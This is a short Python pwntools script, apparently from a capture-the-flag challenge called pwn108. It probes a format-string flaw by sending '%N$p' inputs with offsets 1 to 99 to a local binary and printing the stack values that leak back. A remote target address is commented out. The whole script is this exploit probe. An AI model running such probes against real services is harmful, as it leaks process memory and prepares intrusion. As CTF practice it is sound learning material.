from pwn import *

context.log_level = 'error'
for i in range(1, 100):
    io = process('./pwn108-1644300489260.pwn108')
    # io = remote('10.48.184.181', '9007')
    payload = f'%{i}$p' + '\n'
    io.recvuntil(b': ')
    io.sendline(b'AAAA')
    io.recvuntil(b': ')
    io.sendline(payload)

    io.recvuntil(b'no  : ')
    p = io.recvuntil(b'\n')
    print(p, i)
    io.close()